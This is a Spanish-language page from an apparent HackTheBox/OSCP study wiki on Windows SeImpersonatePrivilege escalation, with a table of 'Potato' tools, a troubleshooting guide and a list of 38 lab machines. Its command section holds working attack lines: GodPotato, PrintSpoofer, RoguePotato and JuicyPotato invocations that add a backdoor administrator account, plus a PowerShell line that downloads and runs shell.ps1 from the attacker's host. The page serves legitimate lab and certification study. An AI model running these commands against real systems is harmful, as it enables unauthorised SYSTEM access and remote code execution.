# Técnica: seimpersonate

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**38 máquina(s)** mencionan esta técnica.

Alias buscados: `seimpersonateprivilege`

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `<TU_IP>` · `<PUERTO>`

### El chequeo de 5 segundos que define tu escalada

```cmd
whoami /priv
```

Si ves **`SeImpersonatePrivilege`** o **`SeAssignPrimaryTokenPrivilege`**,
casi seguro sos `SYSTEM` en minutos.

Aparece típicamente en: cuentas de servicio IIS (`iis apppool\`), el service
account de MSSQL, y cualquier proceso que corra bajo una cuenta de servicio.
**Si tu foothold fue un servidor web o MSSQL, revisá esto PRIMERO.**

### Elegir la herramienta según la versión de Windows

| Herramienta | Windows objetivo | Requisito extra |
|---|---|---|
| **GodPotato** | Server 2012–2022, Win 8–11 | .NET 4+ — **el más amplio, empezá por acá** |
| **PrintSpoofer** | Win 10, Server 2016/2019 | Servicio Print Spooler activo |
| **RoguePotato** | Server 2019, Win 10 1809+ | Redireccionador `socat` en tu Kali |
| **JuicyPotato** | Win 7/8/10 ≤1809, Server ≤2016 | Un CLSID válido para esa build |
| **SweetPotato** | Combina varios | — |
| **SharpEfsPotato** | Amplio | Vía EFSRPC |

### GodPotato — sin dependencias ni redireccionador

```cmd
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net user hacker P@ss123 /add"
GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"
GodPotato.exe -cmd "powershell -c iex(new-object net.webclient).downloadstring('http://<TU_IP>:8000/shell.ps1')"
```

### PrintSpoofer

```cmd
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -c "cmd /c whoami"
PrintSpoofer.exe -c "cmd /c net localgroup administrators <USER> /add"
```

### RoguePotato — necesita redireccionador

```bash
# En tu Kali, primero levantar el redireccionador
socat tcp-listen:135,reuseaddr,fork tcp:<IP_DE_LA_VICTIMA>:9999
```

```cmd
RoguePotato.exe -r <TU_IP> -e "cmd /c whoami" -l 9999
```

### JuicyPotato — necesita CLSID

El CLSID del `PrintNotify` clásico es:
`{4991d34b-80a1-4291-83b6-3328366b9097}`

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami" -t * -c {4991d34b-80a1-4291-83b6-3328366b9097}
```

### Cuando falla: leé el motivo, no pruebes a ciegas

Caso real del corpus (máquina **Cereal**): PrintSpoofer **no funcionó** porque la
máquina era **Windows Server Core** (sin servicio de spooler) y además no había
**135/TCP saliente**. Tuvo que usar **GenericPotato** por un SSRF interno.

Diagnóstico antes de insistir:

```cmd
:: ¿Está el spooler?
sc query spoolsv
:: ¿Hay 135 saliente? (desde la víctima hacia tu Kali)
powershell -c "Test-NetConnection <TU_IP> -Port 135"
:: ¿Qué build es?
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

| Síntoma | Causa probable |
|---|---|
| PrintSpoofer no encuentra el spooler | Server Core, o spooler deshabilitado |
| RoguePotato no conecta | Falta el redireccionador, o 135 filtrado |
| GodPotato falla con error de .NET | Falta .NET 4 → probá PrintSpoofer |
| Todos fallan y hay 135 filtrado | Buscá un SSRF interno, o pasá a otra vía |

### Buscar los ejecutables

Todos están en el corpus de writeups. Para verlos en uso:
```bash
python3 herramientas/buscar.py "GodPotato|PrintSpoofer|JuicyPotato|RoguePotato" -v
```

## Referencias

- [[LOLBAS|LOLBAS (espejo local)]] — https://lolbas-project.github.io/
- [HackTricks](https://book.hacktricks.wiki/)

---

## Máquinas

- [[htb-darkzero\|DarkZero]] — 24 mención(es) · Windows · Hard
- [[htb-signed\|Signed]] — 22 mención(es) · Windows · Medium
- [[htb-interactive\|htb-interactive]] — 21 mención(es)
- [[htb-pivotapi\|PivotAPI]] — 11 mención(es) · Windows · Insane
- [[htb-media\|Media]] — 9 mención(es) · Windows · Medium
- [[htb-tally\|Tally]] — 9 mención(es) · Windows · Hard
- [[htb-visual\|Visual]] — 9 mención(es) · Windows · Medium
- [[htb-ghost\|Ghost]] — 8 mención(es) · Windows · Insane
- [[htb-mailing\|Mailing]] — 8 mención(es) · Windows · Easy
- [[htb-pivotapi-more\|Three More PivotAPI Unintendeds]] — 8 mención(es)
- [[htb-breach\|Breach]] — 6 mención(es) · Windows · Medium
- [[htb-job\|Job]] — 6 mención(es) · Windows · Medium
- [[htb-perspective\|Perspective]] — 6 mención(es) · Windows · Insane
- [[htb-sendai\|Sendai]] — 6 mención(es) · Windows · Medium
- [[htb-cereal\|Cereal]] — 5 mención(es) · Windows · Hard
- [[htb-scrambled-beyond-root\|Scrambled - Alternative Roots]] — 5 mención(es)
- [[htb-worker\|Worker]] — 5 mención(es) · Windows · Medium
- [[htb-acute\|Acute]] — 4 mención(es) · Windows · Hard
- [[htb-arkham\|Arkham]] — 4 mención(es) · Windows · Medium
- [[htb-bounty\|Bounty]] — 4 mención(es) · Windows · Easy
- [[htb-fighter\|Fighter]] — 4 mención(es) · Windows · Insane
- [[htb-haze\|Haze]] — 4 mención(es) · Windows · Hard
- [[htb-json\|Json]] — 4 mención(es) · Windows · Medium
- [[htb-querier\|Querier]] — 4 mención(es) · Windows · Medium
- [[htb-silo\|Silo]] — 4 mención(es) · Windows · Medium
- [[htb-apt\|APT]] — 2 mención(es) · Windows · Insane
- [[htb-conceal\|Conceal]] — 2 mención(es) · Windows · Hard
- [[htb-escape\|Escape]] — 2 mención(es) · Windows · Medium
- [[htb-ethereal\|Ethereal]] — 2 mención(es) · Windows · Insane
- [[htb-freelancer\|Freelancer]] — 2 mención(es) · Windows · Hard
- [[htb-grandpa\|Grandpa]] — 2 mención(es) · Windows · Easy
- [[htb-hackback\|Hackback]] — 2 mención(es) · Windows · Insane
- [[htb-lustroustwo\|LustrousTwo]] — 2 mención(es) · Windows · Hard
- [[htb-napper\|Napper]] — 2 mención(es) · Windows · Hard
- [[htb-pov\|Pov]] — 2 mención(es) · Windows · Medium
- [[htb-proper\|Proper]] — 2 mención(es) · Windows · Hard
- [[htb-rainbow\|Rainbow]] — 2 mención(es) · Windows · Medium
- [[htb-vulnescape\|VulnEscape]] — 2 mención(es) · Windows · Easy

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'seimpersonate' -v
python3 _sistema/herramientas/buscar.py 'seimpersonate' -v --oscp
```
